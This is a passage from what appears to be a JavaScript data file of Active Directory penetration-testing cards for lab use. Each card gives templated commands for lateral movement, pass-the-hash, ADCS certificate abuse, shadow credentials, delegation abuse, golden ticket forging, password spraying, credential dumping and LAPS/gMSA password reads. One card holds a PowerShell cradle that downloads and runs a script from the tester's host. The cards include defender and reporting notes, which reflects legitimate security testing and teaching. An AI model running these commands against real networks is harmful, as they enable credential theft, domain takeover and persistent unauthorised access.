\'{{password}}\' -X \'whoami\'',note:'WinRM flavor of the same trick — no SMB service artifacts at all, output returns over 5985.'},{tool:'powershell',v:'win',run:'Enter-PSSession -ComputerName {{target}} -Credential $cred',note:'Native PSRemoting — build $cred with PSCredential (see the writedacl-dcsync card), or run from a pth-spawned shell to skip creds entirely.'},{tool:'psexec',v:'win',run:'.\\PsExec.exe \\\\{{target}} cmd',note:'Sysinternals PsExec from Windows rides your current logon or injected hash context — no password on the command line.'},{tool:'evil-winrm',v:'winrm',run:"evil-winrm -i {{target}} -u {{user}} -p '{{password}}'",note:'Best interactive experience when 5985/5986 is open. -H for hash auth.'},{tool:'impacket-psexec',v:'psexec',run:"impacket-psexec '{{domain}}/{{user}}:{{password}}'@{{target}}",note:'Service-based SYSTEM shell. Loud but reliable.'},{tool:'impacket-psexec',v:'psexec',run:"impacket-psexec -hashes ':{{hash}}' {{user}}@{{target}}",note:'Pass-the-hash variant — no plaintext needed.'},{tool:'impacket-wmiexec',v:'wmi',run:"impacket-wmiexec '{{domain}}/{{user}}:{{password}}'@{{target}}",note:'Quieter; no service created.'}],expected:['C:\\Windows\\system32>','[*] Establishing connection'],onFailure:{'STATUS_ACCESS_DENIED':{note:'Cred valid but not admin on this host. Try other hosts — reuse across the subnet is the norm in labs.'},'WinRM connection refused':{note:'5985 not open; fall back to psexec/wmiexec over 445.'}},defender:'psexec creates a service (Event 7045 + a random-named binary); WinRM logs 4624 type 3 and process creation under svchost.',report:{finding:'Lateral Movement via Exposed Credentials',severity:'high'},tools:['evil-winrm','impacket-psexec','impacket-wmiexec','powershell','PsExec','nxc'],os:['windows'],refs:['https://github.com/fortra/impacket','https://github.com/netexec-community/nxc','https://lolbas-project.github.io/']},

{id:'adcs-esc',lane:'ad',title:'ADCS Misconfiguration Abuse (ESC1-8)',hypothesis:'Active Directory Certificate Services with vulnerable templates lets ordinary users request certificates for ANY identity (ESC1: client-auth template + enrollment rights + enrollee supplies subject). A certificate is a credential: authenticate as Domain Admin with it. certipy finds the misconfigs; the same tool does the request and the auth.',prereq:{all:['credential.available']},produces:['adcs.vulnerable','credential.certificate'],commands:[{tool:'certipy',run:"certipy find -u {{user}}@{{domain}} -p '{{password}}' -dc-ip {{target}} -vulnerable",note:'Enumerate templates and CAs; -vulnerable filters to exploitable configs. Read the output carefully — it names the ESC number.'},{tool:'certipy',run:"certipy req -u {{user}}@{{domain}} -p '{{password}}' -dc-ip {{target}} -ca {{ca_name}} -template {{template}} -upn administrator@{{domain}}",note:'ESC1: request a cert as Administrator. Requires the CA and template names from find.'},{tool:'certipy',run:'certipy auth -pfx administrator.pfx -dc-ip {{target}}',note:'Authenticate with the certificate; returns a TGT and the NTLM hash.'}],expected:['Got certificate','Saved certificate','Got hash'],onFailure:{'No vulnerable templates found':{note:'Check for weak permissions on the CA itself and HTTP enrollment endpoints (ESC8) before concluding the lane is dead.'},'ACCESS_DENIED on request':{note:'Enrollment rights missing for your account. ESC paths are account-specific — try other accounts you hold.'}},defender:'Certificate request events (4886/4887) with unusual subject alt names; template permission changes.',report:{finding:'ADCS Template Misconfiguration',severity:'critical'},tools:['certipy'],os:['windows'],refs:['https://posts.specterops.io/certified-pre-owned-d95910965cd2','https://github.com/ly4k/Certipy','https://github.com/GhostPack/Certify']},

{id:'shadow-credentials',lane:'ad',title:'Shadow Credentials',hypothesis:'If you have GenericWrite over a computer or user object (from ACL abuse or a relay), you can write a key to its msDS-KeyCredentialLink attribute and then authenticate as that object with the certificate you just added. Requires ADCS present (2016+ DC functional level). Silent, and the target object never logs a password change.',prereq:{any:['ad.control_paths','relay.success']},produces:['credential.certificate'],commands:[{tool:'pywhisker',run:'pywhisker.py -d {{domain}} -u {{user}} -p {{password}} --target {{target_sam}} --action list',note:'List existing key credentials first — verify your write access theory.'},{tool:'pywhisker',run:'pywhisker.py -d {{domain}} -u {{user}} -p {{password}} --target {{target_sam}} --action add',note:'Adds your key. Then auth with the generated PFX via certipy or Rubeus asktgt /certificate.'}],expected:['Successfully updated','pfx'],onFailure:{'insufficient access rights':{note:'You lack GenericWrite on the target. Re-derive the path in BloodHound — who has write on the object, and can you become them?',card:'bloodhound-collect'}},defender:'Event 5136/4662 on msDS-KeyCredentialLink modification; new device registration-like artifacts.',report:{finding:'Shadow Credentials via Object Write Access',severity:'high'},tools:['pywhisker','certipy'],os:['windows'],refs:['https://github.com/ShutdownRepo/pywhisker','https://github.com/GhostPack/Whisker']},

{id:'delegation-abuse',lane:'ad',title:'Kerberos Delegation Abuse',hypothesis:'Delegation lets services impersonate users. Unconstrained delegation: a host caches TGTs of everyone who connects — coerce the DC to connect to it (PetitPotam) and you hold the DC TGT. Constrained/RBCD: abuse write access to set msDS-AllowedToActOnBehalfOfOtherIdentity and impersonate anyone to the target service.',prereq:{any:['access.admin','ad.computer_added','ad.control_paths']},produces:['hash.tgt','foothold.windows'],commands:[{tool:'rubeus',run:'Rubeus.exe monitor /interval:5 /filteruser:{{dc_account}}',note:'On an unconstrained-delegation host you control: watch for the DC TGT after coercion.'},{tool:'impacket-addcomputer',run:'impacket-addcomputer {{domain}}/{{user}}:{{password}} -dc-ip {{target}} -computer-name OBOL$ -computer-pass {{password}}',note:'RBCD step 1: add a machine account you control (if quota allows). Used by ntlmrelayx --add-computer too.'},{tool:'impacket-rbcd',run:'impacket-rbcd -delegate-from OBOL$ -delegate-to {{target_sam}} -action write {{domain}}/{{user}}:{{password}}',note:'RBCD step 2: grant your machine delegation rights on the target. Then getST -spn cifs/target -impersonate administrator.'}],expected:['Ticket received','Delegation rights modified'],onFailure:{'quota exceeded':{note:'MachineAccountQuota is 0. Use a relay (--add-computer) or an existing computer object you control.',card:'ntlm-relay'}},defender:'Event 4741 (computer created), 5136 on delegation attributes; unconstrained delegation hosts are a known audit item.',report:{finding:'Kerberos Delegation Abuse Path',severity:'critical'},tools:['rubeus','impacket-addcomputer','impacket-rbcd','impacket-getST'],os:['windows']},

{id:'golden-ticket',lane:'ad',title:'Golden Ticket (Post-Domain-Admin)',hypothesis:'With the krbtgt hash (from DCSync or NTDS) you can forge TGTs for any user with any group membership — persistence that survives password resets of every account except krbtgt itself. This is post-compromise proof and persistence, not an entry vector.',prereq:{any:['hash.krbtgt']},produces:['persistence.domain'],commands:[{tool:'impacket-ticketer',run:"impacket-ticketer -nthash {{hash}} -domain-sid {{domain_sid}} -domain {{domain}} administrator",note:'Forge a TGT. Get the domain SID via lookupsid or BloodHound. Export the ccache, then use -k flags with impacket tools.'}],expected:['Saving ticket','administrator.ccache'],onFailure:{'KDC cannot verify':{note:'Wrong SID or hash. Re-pull krbtgt and verify the domain SID independently.'}},defender:'Golden tickets show as TGTs with anomalous lifetimes or PAC inconsistencies; hard to catch without baseline analytics.',report:{finding:'Domain Persistence via Golden Ticket',severity:'critical'},tools:['impacket-ticketer'],os:['windows'],refs:['https://github.com/gentilkiwi/mimikatz','https://github.com/fortra/impacket']},

{id:'trust-enum',lane:'ad',title:'Trust Relationships & Forest Hopping',hypothesis:'Domains and forests linked by trusts may authenticate each other\'s users — and trust misconfigurations turn one compromised domain into two. Enumerate trusts after any domain foothold; BloodHound maps them, and foreign group membership (a user from domain A in a privileged group of domain B) is the classic hop.',prereq:{any:['credential.available','ad.graph.collected']},produces:['ad.trusts'],commands:[{tool:'sh',run:'nltest /domain_trusts',note:'From a domain-joined foothold: list trusts the fast way.'},{tool:'sh',run:"Get-DomainTrust | ? {$_.TrustAttributes -match 'WITHIN_FOREST|FOREST_TRANSITIVE'}",note:'PowerView: trusts with attributes. BloodHound\'s "Map Domain Trusts" query visualizes the same.'},{tool:'impacket-lookupsid',run:"impacket-lookupsid '{{domain}}/{{user}}:{{password}}'@{{target}}",note:'SID enumeration on a trusted domain to enumerate its users through the trust.'}],expected:['Trusted Domains','ForestTransitive'],onFailure:{'no trusts':{note:'Single-domain environment — this lane is closed; note it and move on.'}},defender:'Cross-domain authentication attempts and lookupsid enumeration against trusted DCs.',report:{finding:'Exploitable Domain Trust Relationship',severity:'high'},tools:['nltest','impacket-lookupsid'],os:['windows']},

{id:'zerologon-check',lane:'ad',title:'Zerologon Check (CVE-2020-1472) — Detection Only',hypothesis:'Zerologon lets an unauthenticated attacker reset a DC machine account password and take the domain. The CHECK is safe and worth running; the EXPLOIT resets the DC\'s machine password and can break the domain if not restored perfectly — destructive-class, and you must restore the original password from your own dump afterward. Verify patch level, think twice, document either way.',prereq:{any:['ad.dc_candidate']},produces:['vuln.candidates'],commands:[{tool:'zerologon-scan',run:"zerologon-scan '{{dc_netbios}}' {{target}}",note:'Safe detection only. Confirms vulnerability WITHOUT changing anything.'}],expected:['VULNERABLE','patched'],onFailure:{'patched':{note:'Good. Move on — there are cleaner paths everywhere else in this lane.'}},defender:'Event 4742 machine account password change from an unauthenticated source; Netlogon channel anomalies.',report:{finding:'Zerologon Vulnerability (CVE-2020-1472)',severity:'critical'},tools:['zerologon-scan'],os:['windows'],refs:['https://github.com/SecuraBV/CVE-2020-1472']},

{id:'wsus-abuse',lane:'ad',title:'WSUS Abuse',hypothesis:'WSUS servers push updates to every Windows machine in the domain — over plain HTTP in misconfigured deployments. Relay or MITM the update channel and you can push a fake "update" (SharpWSUS/WSUSpendu) that runs as SYSTEM on every client that checks in. Look for WSUS when you have a relay position or a compromised server.',prereq:{any:['relay.success','access.admin']},produces:['access.system','persistence.domain'],commands:[{tool:'sharpwsus',run:'SharpWSUS.exe locate',note:'From a foothold: find the WSUS server via registry/GPO.'},{tool:'sharpwsus',run:'SharpWSUS.exe inspect',note:'Confirm whether updates flow over HTTP (abusable) or HTTPS (much harder).'}],expected:['http://','WSUS Server'],onFailure:{'https':{note:'HTTPS-enforced WSUS largely closes this. Look for SCCM instead.',card:'sccm-enum'}},defender:'Unexpected update approvals in the WSUS console and unsigned update binaries are the tell.',report:{finding:'WSUS Update Channel Abuse',severity:'critical'},tools:['sharpwsus'],os:['windows'],refs:['https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/wsus-spoofing']},

{id:'sccm-enum',lane:'ad',title:'SCCM/MECM Enumeration & Abuse',hypothesis:'SCCM manages software deployment across the fleet — compromise it and you push code to everything as SYSTEM. Even before that, SCCM enumeration leaks credentials (network access accounts, task sequences with embedded passwords) via LDAP and the site\'s SMB shares. SharpSCCM and sccmhunter are the toolkits.',prereq:{any:['credential.available']},produces:['credential.candidate','ad.attack_paths'],commands:[{tool:'sccmhunter',run:"sccmhunter.py find -u {{user}}@{{domain}} -p '{{password}}' -dc-ip {{target}}",note:'Locate SCCM site servers and management points from LDAP.'},{tool:'sccmhunter',run:"sccmhunter.py smb -u {{user}}@{{domain}} -p '{{password}}' -dc-ip {{target}}",note:'Enumerate SCCM shares — task sequences and scripts with embedded creds live here.'}],expected:['sitecode','MECM','SCCM'],onFailure:{'no SCCM':{note:'Not present. Note it and move on.'}},defender:'SCCM site database access and share reads are auditable; rogue device enrollment events stand out.',report:{finding:'SCCM Credential Exposure',severity:'high'},tools:['sccmhunter','SharpSCCM'],os:['windows'],refs:['https://github.com/Mayyhem/SharpSCCM']},

{id:'nxc-arsenal',lane:'ad',title:'NetExec Arsenal (One Tool, Most of AD)',hypothesis:'NetExec is the AD multitool: enumeration, validation, spidering, roasting, dumping, and execution checks, all with the same auth syntax. Learn the flag families once and you can drive most of a domain assessment from one tool. This card is the cheat sheet; the Tools view collects every nxc command in one place.',prereq:{any:['smb.reachable','port:445','credential.available']},produces:['enum.deep','credential.candidate'],commands:[{tool:'nxc',run:'nxc smb {{target}} -u {{userlist}} -p {{password}}',note:'Spray/validate: one password across users. --continue-on-success to keep going after a hit.'},{tool:'nxc',run:'nxc smb {{target}} -u {{user}} -p {{password}} --users --groups --shares',note:'Authenticated pull: users, groups, and share permissions in one shot.'},{tool:'nxc',run:'nxc smb {{target}} -u {{user}} -p {{password}} -M spider_plus',note:'Share spider: dumps a JSON inventory of every readable file. Grep the output for creds/configs/keys.'},{tool:'nxc',run:'nxc ldap {{target}} -u {{user}} -p {{password}} --asreproast {{hashfile}}',note:'AS-REP roast via nxc — no Impacket needed.'},{tool:'nxc',run:'nxc ldap {{target}} -u {{user}} -p {{password}} --kerberoasting {{hashfile}}',note:'Kerberoast via nxc.'},{tool:'nxc',run:'nxc smb {{target}} -u {{user}} -H {{hash}}',note:'Pass-the-hash validation: where does this hash work? Point it at the whole subnet to find reuse.'},{tool:'nxc',run:'nxc smb {{target}} -u {{user}} -p {{password}} --sam',note:'Pwned box: dump local SAM hashes. --lsa for LSA secrets, --ntds on a DC for the domain database.'},{tool:'nxc',run:'nxc winrm {{target}} -u {{user}} -p {{password}} -x "whoami"',note:'Execution check over WinRM — confirms shell-level access without a full session.'}],expected:['[+]','Pwn3d!'],onFailure:{'STATUS_LOGON_FAILURE':{note:'Bad cred or hash. Re-validate against a known-good context before concluding it died.'},'STATUS_ACCESS_DENIED on --sam':{note:'Valid cred but not local admin on that host. Sweep the subnet — admin rights are rarely uniform.'}},defender:'nxc is heavily signatured (user-agent strings, logon patterns); spraying and SAM dumps light up 4625/4663 events.',report:{finding:'Credential Access and Reuse via SMB/WinRM',severity:'high'},tools:['nxc'],os:['windows'],refs:['https://www.netexec.wiki/','https://github.com/netexec-community/nxc']},

{id:'kerberos-tickets',lane:'ad',title:'Kerberos Ticket Hygiene (The Stuff Everyone Forgets)',hypothesis:'Half of all "impacket is broken" moments in AD labs are Kerberos hygiene: clock skew over 5 minutes kills authentication, tools need tickets via KRB5CCNAME, and kinit/getTGT are how you get them. Sync time FIRST on any AD box, then manage tickets explicitly.',prereq:{any:['kerberos.reachable','ad.dc_candidate']},produces:['kerberos.tickets'],commands:[{tool:'ntpdate',run:'sudo ntpdate -u {{target}}',note:'Sync your clock to the DC FIRST. KDC_ERR_SKEW is the #1 silent killer in AD labs. faketime is the alternative when the DC time is deliberately wrong.'},{tool:'impacket-getTGT',run:"impacket-getTGT '{{domain}}/{{user}}:{{password}}'",note:'Plaintext to ccache ticket.'},{tool:'impacket-getTGT',run:"impacket-getTGT -hashes ':{{hash}}' '{{domain}}/{{user}}'",note:'Hash variant — same ticket, no password needed.'},{tool:'sh',run:'export KRB5CCNAME={{user}}.ccache && klist',note:'Point the environment at your ticket, then verify it. Now every impacket -k flag and kinit-based tool works.'},{tool:'kinit',run:"kinit {{user}}@{{domain}}",note:'MIT-tools alternative; prompts for the password. Keytabs work too: kinit -k -t {{file}} {{user}}@{{domain}}.'}],expected:['Saving ticket','Valid starting','Ticket cache'],onFailure:{'KDC_ERR_SKEW':{note:'Clock skew — you skipped the ntpdate step. Sync and retry.',card:'kerberos-tickets'},'KDC_ERR_PREAUTH_FAILED':{note:'Wrong password or expired ticket. Re-pull with getTGT and retry.'},'KRB5CCNAME not found':{note:'You exported the path but the file is elsewhere — klist to see what is actually cached.'}},defender:'Ticket requests log as 4768/4769; faketime and skew games are invisible server-side.',report:{finding:'',severity:'informational'},tools:['ntpdate','impacket-getTGT','kinit','klist'],os:['windows'],refs:['https://github.com/GhostPack/Rubeus','https://github.com/gentilkiwi/mimikatz']},

{id:'bloodyad-acl',lane:'ad',title:'ACL Abuse with bloodyAD',hypothesis:'Modern AD privilege paths are ACL paths: GenericAll, WriteDacl, WriteOwner, or group-membership write rights over an object let you escalate by editing the directory — add yourself to groups, take ownership, grant yourself control, force password resets, or set up shadow credentials. BloodHound shows which edges you hold; bloodyAD executes them from Linux without RSAT.',prereq:{any:['credential.available','ad.attack_paths']},produces:['ad.control_paths','credential.candidate'],commands:[{tool:'bloodyad',run:"bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' get writable --detail",note:'Start here: what can your account actually write? The detail output is your menu.'},{tool:'bloodyad',run:"bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' add groupMember \"{{group}}\" {{user}}",note:'Group-write edge: add yourself (or a controlled account) to the target group. Re-login/re-ticket for it to take effect.'},{tool:'bloodyad',run:"bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' set owner {{target_sam}} {{user}}",note:'WriteOwner edge: seize ownership of the object...'},{tool:'bloodyad',run:"bloodyAD -d {{domain}} --host {{target}} -u {{user}} -p '{{password}}' add genericAll {{target_sam}} {{user}}",note:'...then grant yourself GenericAll. Now you can reset its password, targeted-Kerberoast it, or add shadow credentials.'},{tool:'impacket-dacledit',run:"impacket-dacledit -action write -rights FullControl -principal {{user}} -target {{target_sam}} '{{domain}}/{{user}}:{{password}}'",note:'Impacket alternative when bloodyAD is not installed.'}],expected:['[+]','modified','updated'],onFailure:{'insufficient access rights':{note:'The edge you tried does not apply to this object class — read the exact edge in BloodHound (abuse tab) and verify you are writing the right object type.',card:'bloodhound-collect'},'group membership not applying':{note:'Group changes need a fresh logon/ticket. Re-run getTGT or reconnect before testing the new rights.',card:'kerberos-tickets'}},defender:'Event 5136/4662 on attribute writes; group membership changes log 4728/4732. ACL abuse is very visible to anyone watching directory changes.',report:{finding:'ACL-Based Privilege Escalation Path',severity:'high'},tools:['bloodyad','impacket-dacledit'],os:['windows'],refs:['https://www.thehacker.recipes/ad/movement/dacl','https://github.com/CravateRouge/bloodyAD']},

{id:'getst-impersonation',lane:'ad',title:'S4U Impersonation (getST)',hypothesis:'Constrained delegation and resource-based constrained delegation let a service account request service tickets as ANY user — including Administrator — via the S4U2self/S4U2proxy extensions. getST -impersonate is the payoff command for the whole delegation lane: it turns delegation rights into a cifs/host ticket as admin on the target.',prereq:{any:['ad.computer_added','ad.control_paths']},produces:['kerberos.tickets','access.admin'],commands:[{tool:'impacket-getST',run:"impacket-getST -spn 'cifs/{{target_sam}}' -impersonate administrator '{{domain}}/{{user}}:{{password}}'",note:'RBCD payoff: ticket as administrator to the target service. Use the FQDN of the target in the SPN.'},{tool:'impacket-getST',run:"impacket-getST -spn 'cifs/{{target_sam}}' -impersonate administrator -hashes ':{{hash}}' '{{domain}}/{{user}}'",note:'Hash variant for machine accounts or when you only hold NTLM.'},{tool:'sh',run:"export KRB5CCNAME=administrator.ccache && impacket-psexec -k -no-pass '{{target_sam}}'",note:'Use the ticket: -k -no-pass with the ccache gets you execution as the impersonated user.'}],expected:['Saving ticket','ccache'],onFailure:{'KDC_ERR_BADOPTION':{note:'Delegation is not configured for that SPN/account pair. Re-check: RBCD is set on the TARGET (msDS-AllowedToActOnBehalfOfOtherIdentity), constrained delegation on the ACCOUNT.',card:'delegation-abuse'},'ticket works but access denied':{note:'You got a ticket for the wrong service class. cifs/ is not http/ — match the SPN to the service you want.'}},defender:'S4U requests log as 4769 with the delegating account; machine accounts suddenly asking for admin tickets is a strong signal.',report:{finding:'Delegation-Based Impersonation to Administrator',severity:'critical'},tools:['impacket-getST'],os:['windows'],refs:['https://github.com/fortra/impacket']},

{id:'gmsa-read',lane:'ad',title:'gMSA Password Read',hypothesis:'Group Managed Service Accounts have long random passwords managed by AD — but the PrincipalsAllowedToRetrieveManagedPassword property decides who may READ the current password blob. If a group you can join (or already hold) is listed, the gMSA password is yours: no cracking, no coercion. BloodHound shows this as ReadGMSAPassword edges; when it shows nothing, enumerate the attribute directly (the corpus Haze pattern).',prereq:{all:['credential.available'],any:['ldap.reachable','ad.control_paths']},produces:['credential.ntlm_hash','credential.available'],commands:[{tool:'sh',run:'Get-ADServiceAccount -Filter * -Properties PrincipalsAllowedToRetrieveManagedPassword',note:'PowerShell on a domain-joined foothold: list gMSAs and who can read each password. Group names like gMSA_Managers are the tell.'},{tool:'bloodyAD',run:"bloodyAD --host {{target}} -d {{domain}} -u {{user}} -p '{{password}}' get object '<gmsa-sam>$' --attr msDS-ManagedPassword",note:'If you are an allowed principal, this returns the password blob; decode the NTLM with a gMSA parser (gMSADumper, DSInternals, or a short python struct unpack).'}],expected:['PrincipalsAllowedToRetrieveManagedPassword','msDS-ManagedPassword'],onFailure:{'access denied':{note:'You are not in the allowed-principals list — but if you have GenericWrite on a listed group, add yourself (see bloodyad-acl) and re-read.'}},defender:'gMSA password reads generate directory-access events; unusual readers are high-signal.',report:{finding:'gMSA Password Readable by Non-Admin Principal',severity:'critical'},tools:['bloodyAD'],os:['windows'],refs:['https://www.thehacker.recipes/ad/movement/ds-creds/gmsa','https://github.com/micahvandeusen/gMSADumper']},

{id:'laps-read',lane:'ad',title:'LAPS Local Admin Password Read',hypothesis:'LAPS stores each machine local admin password in a computer attribute (ms-Mcs-AdmPwd / msLAPS-Password). Read rights are delegated — frequently to helpdesk or workstation-admin groups you can get into. One attribute read = local admin on that box, and lab local-admin passwords are reused everywhere.',prereq:{all:['credential.available'],any:['ldap.reachable','ad.control_paths']},produces:['credential.plaintext','access.admin'],commands:[{tool:'nxc',run:"nxc ldap {{target}} -u {{user}} -p '{{password}}' -M laps",note:'NetExec module dumps readable LAPS passwords for all computers in one shot.'},{tool:'sh',run:"Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Select-Object Name,ms-Mcs-AdmPwd",note:'PowerShell variant on a domain-joined host. Legacy LAPS attribute; Windows LAPS uses msLAPS-Password (encrypted — needs the LAPS PowerShell module or laps.py to decrypt).'}],expected:['ms-Mcs-AdmPwd','LAPS'],onFailure:{'no results':{note:'No read rights with current user — check BloodHound for ReadLAPSPassword edges, or find a path into a delegated group.'}},defender:'Attribute reads on computer objects at scale and by unexpected users are detectable via SACLs.',report:{finding:'LAPS Passwords Readable by Non-Admin',severity:'high'},tools:['nxc'],os:['windows'],refs:['https://www.thehacker.recipes/ad/movement/ds-creds/laps']},

{id:'ticket-reuse',lane:'ad',title:'Pass-the-Ticket / Overpass-the-Hash',hypothesis:'Stolen or forged Kerberos tickets (.kirbi / ccache) work without knowing any password — you ARE that principal until expiry. On Windows, Rubeus injects tickets into the session; on Linux, point KRB5CCNAME at the ccache file and impacket -k does the rest. Also: an NTLM hash converts to a TGT via overpass-the-hash (Rubeus asktgt / getTGT with -hashes), giving you Kerberos where only NTLM was available.',prereq:{any:['kerberos.tickets','credential.ntlm_hash','hash.ntlm']},produces:['access.admin','lateral.movement'],commands:[{tool:'rubeus',run:'Rubeus.exe ptt /ticket:{{file}}',note:'Windows: inject a .kirbi ticket into the current session (pass-the-ticket). klist confirms.'},{tool:'rubeus',run:'Rubeus.exe asktgt /user:{{user}} /rc4:{{hash}} /ptt',note:'Overpass-the-hash: NTLM hash → TGT, injected directly.'},{tool:'sh',run:'export KRB5CCNAME={{file}} && impacket-psexec -k -no-pass {{domain}}/{{user}}@{{target_sam}}.{{domain}}',note:'Linux: ccache ticket + any impacket tool with -k -no-pass. ticketConverter.py converts kirbi to ccache and back.'}],expected:['Ticket successfully imported','ServicePrincipalName'],onFailure:{'KRB_AP_ERR_SKEW':{note:'Clock skew — sync with ntpdate first (see kerberos-tickets).'},'KDC_ERR_TGT_REVOKED':{note:'Ticket dead or account changed — get a fresh one.'}},defender:'Tickets used from hosts that never did the original AS-REQ; ticket-lifetime anomalies.',report:{finding:'Kerberos Ticket Theft and Reuse',severity:'critical'},tools:['rubeus','impacket-psexec'],os:['windows','linux'],refs:['https://www.thehacker.recipes/ad/movement/kerberos/ptt']},

{id:'powerview-enum',lane:'ad',title:'PowerView Enumeration (from a Windows Foothold)',hypothesis:'Once you are ON a domain-joined Windows box, PowerView gives deep AD recon from the inside without any extra privileges: users, groups, computers, SPN accounts (kerberoast targets), sessions, local-admin mapping, share hunting. It answers the questions BloodHound graphs ask, interactively. Import it to memory, then work the questions below in order — each one produces a named, actionable list.',prereq:{any:['foothold.windows']},produces:['ad.attack_paths','ad.control_paths','ad.user_list'],commands:[{tool:'powershell',run:"IEX(New-Object Net.WebClient).downloadString('http://{{lhost}}:8000/PowerView.ps1')",note:'In-memory load from your HTTP server. Offline/file variant: Import-Module .\\PowerView.ps1 (run powershell -ep bypass first). AMSI note: plain-text download cradles get flagged on modern boxes — if blocked, fall back to the .NET/ADSI card (ad-psdotnet-enum).'},{tool:'powershell',run:'Get-NetDomain',note:'Domain basics: forest, DCs, and PdcRoleOwner (the DC to query). Replaces the manual .NET GetCurrentDomain() call.'},{tool:'powershell',run:'Get-NetUser | select cn,pwdlastset,lastlogon',note:'All users with password age and last logon. Dormant accounts (never logged on, old pwdlastset) are quiet takeover targets; passwords unchanged since a policy change are often weak. Get-NetUser | select cn for the clean list.'},{tool:'powershell',run:'Get-NetGroup | select cn',note:'All groups. Then Get-NetGroup "Sales Department" | select member for membership — nested groups show as DNs; chase them one level down.'},{tool:'powershell',run:'Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion',note:'Every machine with OS and build — oldest OS is usually the softest target, and build numbers feed patch-gap analysis.'},{tool:'powershell',run:'Get-NetUser -SPN | select samaccountname,serviceprincipalname',note:'Kerberoast targets from the inside — service accounts with SPNs. Same answer GetUserSPNs gets from outside; the SPN itself reveals the service and host (resolve with nslookup).'},{tool:'powershell',run:'Find-LocalAdminAccess',note:'Where does YOUR current user have local admin? The classic lateral-movement oracle. Takes minutes on big domains — let it run.'},{tool:'powershell',run:'Get-NetSession -ComputerName {{target}}',note:'Who is logged in where (NetSessionEnum). Note: modern Windows (10 1709+/11, Server 2019+) restricts this to admins — Access Denied is the OS, not you. Older boxes still answer.'},{tool:'powershell',run:"Invoke-ShareFinder -Verbose | Select-String -Pattern 'READ'",note:'Hunt readable shares across the domain; loot them for configs and creds (see stored-credentials).'}],expected:['samaccountname','LocalAdminAccess'],onFailure:{'not recognized':{note:'PowerView not loaded — the IEX cradle failed (network, AMSI, or typo). Load from a local file with . .\\PowerView.ps1 instead, or use the .NET/ADSI card.'}},defender:'Script-block logging catches the cradle and every cmdlet; PowerView is heavily signatured by AMSI on patched systems.',report:{finding:'',severity:'informational'},tools:['powershell'],os:['windows'],refs:['https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon']},

{id:'ad-legacy-enum',lane:'ad',title:'AD Enumeration with Built-In Windows Tools',hypothesis:'No uploads, no AMSI, no signatures: net.exe, setspn, and nltest ship with Windows and answer most first-pass AD questions — users, groups, group membership, SPNs, DCs, password policy. On a fresh Windows foothold these are your first five minutes, and they work from any domain-joined context, even heavily monitored ones. RDP in rather than WinRM when you can: PowerShell Remoting sessions run into the Kerberos double-hop problem and cannot always query the DC, while an RDP session has no such limit.',prereq:{any:['foothold.windows','access.desktop']},produces:['ad.user_list','ad.attack_paths'],commands:[{tool:'xfreerdp',run:"xfreerdp /v:{{target}} /u:{{user}} /p:'{{password}}' /d:{{domain}} /cert:ignore +clipboard /dynamic-resolution",note:'Get a real desktop first. OffSec doctrine: prefer RDP over WinRM for enumeration — WinRM hits the Kerberos double-hop problem (your session cannot re-authenticate to the DC for some queries). /cert:ignore quiets prompts.'},{tool:'cmd',run:'net user /domain',note:'Every domain user. Then per-user detail: net user {{user}} /domain — group memberships, last logon, password age, account flags.'},{tool:'cmd',run:'net group /domain',note:'Every domain group. Membership: net group "Domain Admins" /domain — quote multiword names. net localgroup administrators on a specific host shows local admins.'},{tool:'cmd',run:'net accounts /domain',note:'Domain password and lockout policy — REQUIRED reading before any spraying (see password-spray). Lockout threshold minus one is your budget.'},{tool:'cmd',run:'setspn -L {{user}}',note:'SPNs registered to a service account (installed by default). HTTP/, MSSQLSvc/, termsrv/ SPNs reveal services AND kerberoast targets without a port scan. nslookup the SPN hostname to get its internal IP.'},{tool:'cmd',run:'nltest /dclist:{{domain}}',note:'Domain controllers. Also: nltest /domain_trusts for trust relationships (see trust-enum).'}],expected:['The command completed successfully','accounts for'],onFailure:{'System error 5':{note:'Access denied — you are querying from a non-domain context or WinRM double-hop. RDP in as a domain user and retry.'},'group could not be found':{note:'Exact name mismatch — net group /domain first, copy the name verbatim including spaces.'}},defender:'net.exe domain queries generate normal-looking LDAP traffic — the stealthiest enum there is. Setspn -L is nearly invisible.',report:{finding:'',severity:'informational'},tools:['xfreerdp','cmd'],os:['windows']},

{id:'ad-psdotnet-enum',lane:'ad',title:'AD Enumeration via PowerShell + .NET (No PowerView)',hypothesis:'When PowerView is signatured or missing, raw .NET classes do the same job with zero imports: System.DirectoryServices.ActiveDirectory finds the PDC, ADSI resolves the domain DN, and DirectorySearcher runs arbitrary LDAP queries. Nothing gets written to disk beyond a script you type yourself, and there are no known signatures to trip. This is the OffSec PEN-200 approach: build the LDAPSearch function once, reuse it for everything.',prereq:{any:['foothold.windows','access.desktop']},produces:['ad.user_list','ad.attack_paths'],commands:[{tool:'powershell',run:"powershell -ep bypass",note:'Bypass execution policy first so scripts/functions actually load. -ep bypass is per-process and not a system change.'},{tool:'powershell',run:"[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()",note:'Domain object: forest, DCs, and PdcRoleOwner — the DC with the freshest data. $PDC = ...GetCurrentDomain().PdcRoleOwner.Name'},{tool:'powershell',run:"([adsi]'').distinguishedName",note:'One-liner for the domain DN (DC=corp,DC=com). No imports needed.'},{tool:'powershell',run:'function LDAPSearch { param([string]$LDAPQuery) $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name; $DistinguishedName = ([adsi]"\'\'").distinguishedName; $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName"); $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery); return $DirectorySearcher.FindAll() }',note:'The reusable function — paste this whole line, or save as function.ps1 and Import-Module it. Every query below is one LDAPSearch call.'},{tool:'powershell',run:'LDAPSearch -LDAPQuery "(samAccountType=805306368)"',note:'All user objects. 805306368 = user account type. Add .properties.samaccountname for clean names.'},{tool:'powershell',run:'LDAPSearch -LDAPQuery "(objectclass=group)"',note:'All groups. For membership: LDAPSearch -LDAPQuery "(&(objectCategory=group)(cn=Sales Department))" | ForEach-Object { $_.properties.member 